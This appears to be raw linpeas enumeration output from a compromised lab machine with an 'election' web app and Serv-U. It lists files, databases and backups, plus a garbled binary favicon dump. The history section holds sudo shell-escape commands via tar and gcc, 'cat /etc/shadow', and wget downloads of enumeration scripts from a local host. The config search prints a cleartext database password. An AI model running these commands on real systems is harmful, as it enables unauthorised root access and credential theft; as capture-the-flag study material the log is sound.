2020-05-23+15:28:32.8368018790 /home/love/.mozilla/firefox/y55nwd4d.default-release/SiteSecurityServiceState.txt
2020-05-23+15:25:02.1887939500 /home/love/.mozilla/firefox/y55nwd4d.default-release/places.sqlite-wal

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                
drwxr-xr-x  3 root root 4096 Oct 20  2019 .
drwxr-xr-x 25 root root 4096 Jun 16  2022 ..
drwxr-xr-x  9 root root 4096 Oct 20  2019 VBoxGuestAdditions-6.0.8

╔══════════╣ Unexpected in root
/vmlinuz.old                                                                                                            
/initrd.img.old
/vmlinuz
/swapfile
/initrd.img

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/tmp/Serv-U-Engine-Tray-SharedMemory                                                                                
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000.journal
/var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system.journal

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                               
logrotate 3.15.1                                                                                                        

    Default mail command:       /bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate.status
    ACL support:                no
    SELinux support:            no
./linpeas.sh: 5138: [: ImPOsSiBleeElastWlogFolder: unexpected operator
./linpeas.sh: 5138: [: ImPOsSiBleeElastWlogFolder: unexpected operator
Writable: /home/love/.local/share/gvfs-metadata/root-7bedd492.log
                                                                                                                        
╔══════════╣ Files inside /home/love (limit 20)
total 916                                                                                                               
drwsrwxrwx 18 love love   4096 May 15 20:51 .
drwxr-xr-x  3 root root   4096 Apr  9  2020 ..
-rw-------  1 love love     92 Jun 16  2022 .bash_history
drwxrwxrwx 15 love love   4096 Apr  8  2020 .cache
drwxrwxrwx 14 love love   4096 May 26  2020 .config
drwxrwxrwx  3 love love   4096 Oct 20  2019 .dbus
drwxrwxrwx  2 love love   4096 Apr  9  2020 Desktop
drwxrwxrwx  2 love love   4096 Apr  8  2020 Documents
drwxrwxrwx  2 love love   4096 Oct 20  2019 Downloads
drwxrwxrwx  3 love love   4096 Oct 20  2019 .gnupg
drwxrwxrwx  2 love love   4096 Oct 20  2019 .gvfs
-rwxrwxrwx  1 love love  10534 Jun 16  2022 .ICEauthority
-rwxrwxr-x  1 love love 830030 May  1 11:14 linpeas.sh
drwxrwxrwx  3 love love   4096 Oct 20  2019 .local
-rw-r--r--  1 root root     33 May 15 19:19 local.txt
drwxrwxrwx  5 love love   4096 Apr  2  2020 .mozilla
drwxrwxrwx  2 love love   4096 Oct 20  2019 Music
drwxrwxrwx  2 love love   4096 Oct 21  2019 Pictures
-rwxrwxrwx  1 love love    807 Oct 20  2019 .profile
drwxrwxrwx  2 love love   4096 Oct 20  2019 Public
-rwxrwxrwx  1 love love     66 Oct 20  2019 .selected_editor
-rw-rw-r--  1 love love     83 May 26  2020 .Serv-U-Tray.conf

╔══════════╣ Files inside others home (limit 20)
/var/www/.bash_history                                                                                                  
/var/www/html/phpinfo.php
/var/www/html/index.html
/var/www/html/election/card.php
/var/www/html/election/themes/shards/js/jquery-3.2.1.min.js
/var/www/html/election/themes/shards/js/popper.min.js
/var/www/html/election/themes/shards/js/jquery.cookie.js
/var/www/html/election/themes/shards/js/bootstrap.min.js
/var/www/html/election/themes/shards/js/moment.min.js
/var/www/html/election/themes/shards/js/shards.min.js
/var/www/html/election/themes/shards/js/bootstrap-notify.js
/var/www/html/election/themes/shards/js/eLection.js
/var/www/html/election/themes/shards/css/shards.min.css
/var/www/html/election/themes/shards/css/reset.min.css
/var/www/html/election/themes/shards/css/font-awesome.min.css
/var/www/html/election/themes/shards/css/shards.tripath.css
/var/www/html/election/themes/shards/css/animate.css
/var/www/html/election/themes/shards/css/material-icons/material-icons.woff2
/var/www/html/election/themes/shards/css/material-icons/material-icons.css
/var/www/html/election/themes/shards/css/bootstrap.min.css

╔══════════╣ Searching installed mail applications
                                                                                                                        
╔══════════╣ Mails (limit 50)
                                                                                                                        
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 1086 Sep 16  2019 /usr/src/linux-headers-5.3.0-46/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 235840 Mar 27  2020 /usr/src/linux-headers-5.3.0-45-generic/.config.old
-rw-r--r-- 1 root root 0 Mar 27  2020 /usr/src/linux-headers-5.3.0-45-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Mar 27  2020 /usr/src/linux-headers-5.3.0-45-generic/include/config/wm831x/backup.h
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-hwe-5.4-headers-5.4.0-120/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 237891 Jun 10  2022 /usr/src/linux-headers-5.4.0-120-generic/.config.old
-rw-r--r-- 1 root root 0 Jun 10  2022 /usr/src/linux-headers-5.4.0-120-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jun 10  2022 /usr/src/linux-headers-5.4.0-120-generic/include/config/wm831x/backup.h
-rwxr-xr-x 1 root root 1086 Sep 16  2019 /usr/src/linux-headers-5.3.0-45/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 235862 Mar 31  2020 /usr/src/linux-headers-5.3.0-46-generic/.config.old
-rw-r--r-- 1 root root 0 Mar 31  2020 /usr/src/linux-headers-5.3.0-46-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Mar 31  2020 /usr/src/linux-headers-5.3.0-46-generic/include/config/wm831x/backup.h
-rwxr-xr-x 1 root root 1086 Sep 16  2019 /usr/src/linux-headers-5.3.0-53/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rwxr-xr-x 1 root root 17152328 Jan 30  2020 /usr/bin/mariabackup
-rwxr-xr-x 1 root root 41671 Jan 30  2020 /usr/bin/wsrep_sst_xtrabackup-v2
-rwxr-xr-x 1 root root 37515 Jan 30  2020 /usr/bin/wsrep_sst_mariabackup
-rwxr-xr-x 1 root root 21273 Jan 30  2020 /usr/bin/wsrep_sst_xtrabackup
-rwxr-xr-x 1 root root 1513 Oct 20  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 14552 Apr  8  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 357 Jan 30  2020 /usr/share/man/man1/wsrep_sst_xtrabackup-v2.1.gz
-rw-r--r-- 1 root root 351 Jan 30  2020 /usr/share/man/man1/wsrep_sst_xtrabackup.1.gz
-rw-r--r-- 1 root root 348 Jan 30  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz
-rw-r--r-- 1 root root 2543 Apr 13  2018 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 974 Mar 17  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-auto.page
-rw-r--r-- 1 root root 755 Mar 17  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-first.page
-rw-r--r-- 1 root root 974 Mar 17  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-auto.page
-rw-r--r-- 1 root root 755 Mar 17  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-first.page
-rw-r--r-- 1 root root 1581 Dec 16  2017 /usr/share/help/C/seahorse/misc-key-backup.page
-rw-r--r-- 1 root root 2505 Apr 16  2018 /usr/share/help/C/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1815 Apr 16  2018 /usr/share/help/C/gnome-help/backup-check.page
-rw-r--r-- 1 root root 1999 Apr 16  2018 /usr/share/help/C/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1320 Apr 16  2018 /usr/share/help/C/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3318 Apr 16  2018 /usr/share/help/C/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2268 Apr 16  2018 /usr/share/help/C/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2356 Apr 16  2018 /usr/share/help/C/gnome-help/backup-how.page
-rw-r--r-- 1 root root 1262 Apr 16  2018 /usr/share/help/C/gnome-help/backup-why.page
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 20021 Jun 16  2022 /var/log/Xorg.1.log.old
-rw-r--r-- 1 www-data www-data 51867 Oct 21  2019 /var/log/Xorg.0.log.old
-rw-r--r-- 1 love love 26737 May 27  2020 /home/love/.local/share/xorg/Xorg.1.log.old
-rwxrwxrwx 1 love love 26754 Oct 20  2019 /home/love/.local/share/xorg/Xorg.0.log.old
-rw-r--r-- 1 root root 8225 May  7  2020 /lib/modules/5.3.0-53-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8225 May  7  2020 /lib/modules/5.3.0-53-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 9073 Jun 10  2022 /lib/modules/5.4.0-120-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9321 Jun 10  2022 /lib/modules/5.4.0-120-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8225 Mar 27  2020 /lib/modules/5.3.0-45-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8225 Mar 27  2020 /lib/modules/5.3.0-45-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8225 Mar 31  2020 /lib/modules/5.3.0-46-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8225 Mar 31  2020 /lib/modules/5.3.0-46-generic/kernel/drivers/power/supply/wm831x_backup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/OfflineCache/index.sqlite: SQLite 3.x database, last written using SQLite version 3031001
Found /home/love/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database, last written using SQLite version 3022000
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/cert9.db: SQLite 3.x database, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/content-prefs.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite: SQLite 3.x database, user version 11, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/favicons.sqlite: SQLite 3.x database, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/formhistory.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/key4.db: SQLite 3.x database, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/permissions.sqlite: SQLite 3.x database, user version 11, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/places.sqlite: SQLite 3.x database, user version 53, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/protections.sqlite: SQLite 3.x database, user version 1, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.google.com/idb/548905059db.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.serv-u.com/idb/3808187126SBWD_.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001                                  
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/moz-extension+++d53c4cd4-0510-4e77-8a00-5abe770f51a8^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001                                
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001                                
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage.sqlite: SQLite 3.x database, user version 131075, last written using SQLite version 3031001
Found /home/love/.mozilla/firefox/y55nwd4d.default-release/webappsstore.sqlite: SQLite 3.x database, user version 2, last written using SQLite version 3031001
Found /snap/core/7270/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /snap/core/7917/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/mlocate/mlocate.db: regular file, no read permission
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3022000

 -> Extracting tables from /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/OfflineCache/index.sqlite (limit 20)                                                                                                                      
 -> Extracting tables from /home/love/.local/share/evolution/addressbook/system/contacts.db (limit 20)                  
  --> Found interesting column names in folder_id_email_list (output limit 10)                                          
CREATE TABLE 'folder_id_email_list' (uid TEXT NOT NULL REFERENCES 'folder_id' (uid), value TEXT)                        

 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/cert9.db (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/content-prefs.sqlite (limit 20)         
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite (limit 20)               
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/favicons.sqlite (limit 20)              
  --> Found interesting column names in moz_icons (output limit 10)                                                     
CREATE TABLE moz_icons ( id INTEGER PRIMARY KEY, icon_url TEXT NOT NULL, fixed_icon_url_hash INTEGER NOT NULL, width INTEGER NOT NULL DEFAULT 0, root INTEGER NOT NULL DEFAULT 0, color INTEGER, expire_ms INTEGER NOT NULL DEFAULT 0, data BLOB )
1, fake-favicon-uri:https://support.mozilla.org/en-US/products/firefox, 136572340459075, 32, 0, None, 1586435128207, �PNG
▒
IHDR szz�gAMA��
               �a cHRMz&�����u0�`:�p��Q<bKGD�C� pHYs

                                                    ��~�tIME�

1�-▒7��p                                                        #,\     VIDATXí�y�_U�?������~�,�����-K����X�
        F��"�▒5DkX$bk�X)���@��C���o}�]���k˦Q�K���%���9��s�����*��]Bȳˑ\D�m������
                                                                               �R��r)��+��`�_!���aV����Oy��o#��g��&TJk���44���>�<�an���@I�;�H1��m�(�Z����ne�r�\��� ��D�=��j���ŤL�XA+$4���{�дZ:�f&�+�Sԉ�}��%�P`.���t▒^:v�4��m�n#�۽Do��JLZ��Sh �`���,uӂ  舉�cDzL�����u?����E��"���W'C��g�]�M��Pz�>�b���'�P��.~�}�s£���
                                                                    B�D�#S�kT{�w����=s�/y▒@��#+�$^n)���eI�=.Na$�$���>��K�:���0�YN��,���,����X�▒E�.���o&G��©5���נg_%Sһ`���%U��}���_/w )�N�U`ao�t����~��)�!�>��,ə���������^E][����]\���f�I,T-T��j�p^o�M��y��6�34���:
"r_�Z�k��▒#▒�@8D�xX<�KUY��s��GVDޛL(<"�
=3�gv~�ĥ\��Wh�����N���XBx}���E���H]t2��$}zږ��s��G��l�W��▒�Z�U��|���"��\~�u����]��
                                                                                 L�L�?�Ԓ��C�A���,"�w
�v���ݼ�<3�����J
               H-d�c�$�y�▒gj�:
��!_k*V�|gC8���;�:}��>(<
�� ���
��5��5l��c>▒��6�T ��ʄ"�ȁQ� ������j6�mȦ!���u�����'�`~�����J���k���+pB�F,�����[S�ٽ�P�PIZh�9r�S�e|��@      �^�i���j*(C4�G,K>����D�k��"p w�-\lr+��Aq�EpO����XC��a��������v>�p�P�BQ2);�<����[��?.���*jՂ3�Ri��\8���K�o\*�c">2(`@(�
���a�&��:��.#KZ�j��|��w񓝗�|P,������ <P
                                     R٦� ▒��h�
                                              �y�
                                                 �7w�B��K
                                                         c�!r▒����P,� T��t�<��ydn       [g��=�S�,�"��׾����E�>�r i�9�%�.��܉���q�{��!�Q�aS�w��u�H.��DʮL�ghkQ=�#.����p{9�Us��kΝ�;��t7*
                                       '��������Ac)�L������a���|���aU�▒4�����HȬS77�m�7����?�����6��;F��g/��3T>F5nERϡ��P�]b���옛��n���mr��=\��A��u��.

  --> Found interesting column names in moz_pages_w_icons (output limit 10)
CREATE TABLE moz_pages_w_icons ( id INTEGER PRIMARY KEY, page_url TEXT NOT NULL, page_url_hash INTEGER NOT NULL )       
1, https://support.mozilla.org/en-US/products/firefox, 47357795150914

 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/formhistory.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/key4.db (limit 20)                      
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/permissions.sqlite (limit 20)           
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/places.sqlite (limit 20)                
  --> Found interesting column names in moz_places (output limit 10)                                                    
CREATE TABLE moz_places (   id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR, visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL, frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER , guid TEXT, foreign_count INTEGER DEFAULT 0 NOT NULL, url_hash INTEGER DEFAULT 0 NOT NULL , description TEXT, preview_image_url TEXT, origin_id INTEGER REFERENCES moz_origins(id))
1, https://support.mozilla.org/en-US/products/firefox, None, gro.allizom.troppus., 0, 0, 0, 137, None, oVrI_xtQb0lb, 1, 47357795150914, None, None, 1

 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/protections.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.google.com/idb/548905059db.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.serv-u.com/idb/3808187126SBWD_.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/moz-extension+++d53c4cd4-0510-4e77-8a00-5abe770f51a8^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite (limit 20)
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage.sqlite (limit 20)               
 -> Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/webappsstore.sqlite (limit 20)          
 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)                                                        
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)                                                        
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                         
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)                                               
                                                                                                                        
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                              
total 24K
drwxrwxr-x  4 www-data www-data 4.0K Oct 21  2019 .
drwxr-xr-x 15 www-data www-data 4.0K Oct 20  2019 ..
-rwxrwxr-x  1 www-data www-data 6.4K May 27  2020 .bash_history
drwxrwxrwx  3 www-data www-data 4.0K May 27  2020 html
drwxrwxr-x  3 www-data www-data 4.0K Oct 21  2019 .local

/var/www/html:
total 32K

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 77 Feb 18 04:12 /usr/local/Serv-U/.Serv-U.conf                                                   
-rw-r--r-- 1 root root 0 Feb 19  2019 /usr/share/php/.lock
-rw------- 1 root root 0 Aug  6  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 1913 Apr  2  2020 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Apr  5  2018 /etc/skel/.bash_logout
-rwxrwxrwx 1 www-data www-data 83 Apr  3  2020 /var/www/html/election/.htaccess
-rw------- 1 gdm gdm 14364 Feb 18 04:12 /var/lib/gdm3/.ICEauthority
-rw-r--r-- 1 root root 1913 Apr  2  2020 /var/cache/apparmor/.features
-rwxrwxrwx 1 love love 66 Oct 20  2019 /home/love/.selected_editor
-rwxrwxrwx 1 love love 10534 Jun 16  2022 /home/love/.ICEauthority
-rw-rw-r-- 1 love love 83 May 26  2020 /home/love/.Serv-U-Tray.conf
-rw------- 1 root root 0 Oct  1  2019 /snap/core/7917/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Sep  1  2015 /snap/core/7917/etc/skel/.bash_logout
-rw------- 1 root root 0 Jun 21  2019 /snap/core/7270/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Sep  1  2015 /snap/core/7270/etc/skel/.bash_logout
-rw------- 1 root root 0 Jul  9  2019 /snap/core18/1066/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  5  2018 /snap/core18/1066/etc/skel/.bash_logout
-rw------- 1 root root 0 Oct 10  2019 /snap/core18/1223/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  5  2018 /snap/core18/1223/etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Feb 18 04:12 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                           
-rw-rw-rw- 1 root root 1184 May 15 20:55 /var/tmp/Serv-U-Engine-Tray-SharedMemory                                       
-rw-r--r-- 1 root root 3667 Apr  3  2020 /var/backups/alternatives.tar.2.gz
-rw-r--r-- 1 www-data www-data 11 Oct 20  2019 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 81920 Jun 16  2022 /var/backups/alternatives.tar.0
-rw-r--r-- 1 www-data www-data 3362 Oct 20  2019 /var/backups/alternatives.tar.4.gz
-rw-r--r-- 1 www-data www-data 43 Oct 20  2019 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 www-data www-data 43 Oct 20  2019 /var/backups/dpkg.arch.3.gz
-rw-r--r-- 1 www-data www-data 43 Oct 20  2019 /var/backups/dpkg.arch.6.gz
-rw-r--r-- 1 www-data www-data 43 Oct 20  2019 /var/backups/dpkg.arch.5.gz
-rw-r--r-- 1 root root 3552 Oct 21  2019 /var/backups/alternatives.tar.3.gz
-rw-r--r-- 1 root root 3668 Apr  8  2020 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 www-data www-data 43 Oct 20  2019 /var/backups/dpkg.arch.2.gz
-rw-r--r-- 1 www-data www-data 43 Oct 20  2019 /var/backups/dpkg.arch.4.gz

╔══════════╣ Searching passwords in history files
su -                                                                                                                    
su -
su -
ssh root@127.0.0.1
pkexec users-admin
su -
Binary file /usr/share/phpmyadmin/js/openlayers/theme/default/img/navigation_history.png matches
sudo su
cat /etc/shadow
cat /etc/passwd
su love
su love
wget http://192.168.1.8:8000/linenum.sh
chmod +x linenum.sh
./linenum.sh
cd root
sudo su
./LinEnum.sh
./LinEnum.sh -h
./LinEnum.sh -t
./LinEnum.sh -t | grep logrotate
./LinEnum.sh -t
sudo -l
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    sudo gcc -wrapper /bin/sh,-s .
mysql -u root -p
wget http://192.168.1.5:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
sudo -E wget $URL -O $LFILE
./LinEnum.sh
sudo su
sudo su
cd root
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
wget http://192.168.1.5:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
cd root
su love
su love
su love
su love

╔══════════╣ Searching passwords in config PHP files
$dbpass='toor';                                                                                                         
$dbuser='phpmyadmin';
    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['nopassword'] = false;
$cfg['ShowChgPassword'] = true;

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                               
/bin/systemd-tty-ask-password-agent
/etc/brlapi.key
/etc/pam.d/common-password
/etc/pam.d/gdm-password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                        
╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                        
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
Binary file /var/log/apache2/access.log.3.gz matches
Binary file /var/log/apache2/access.log.6.gz matches
Binary file /var/log/apache2/error.log.4.gz matches
Binary file /var/log/auth.log.1 matches
Binary file /var/log/installer/initial-status.gz matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955a86b2304e-fb5e4a94ae81d419.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955d1821d9b0-bdc429cc02d5846a.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955db7e2ea2b-3c8e4f639b5032e9.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955dca6c008f-ba973a02d0276859.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955dea1149ee-83859cee03624b28.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955df2e276d1-4a8972c86942b82e.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a2504a9c9dfc-d920275ea813eebd.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a250630e8c31-468fab4ccdbf5db1.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a2c6c7dda5ef-564c95955a1d118b.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a64d25e5c551-bf175211d31968b6.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a68a601fd41b-36fc6ef69d74b47a.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a68a8c25529c-251bf606cc5785dd.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a68afc42f982-355c4e26606e3124.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a69e8295f317-daefe53c31dc22c3.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005e1917a10f54b-2ae969afa7ba9e00.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005f4c256eaa0a8-5e776725ebc498fe.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005f4ed05ec4d47-eb89097e891d4578.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system.journal matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000@0005a68a67c8072e-f753d07b43cf9073.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000@0005a68a9206cbff-e5caa186c537073a.journal~ matches
Binary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000.journal matches
Binary file /var/log/syslog.1 matches
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
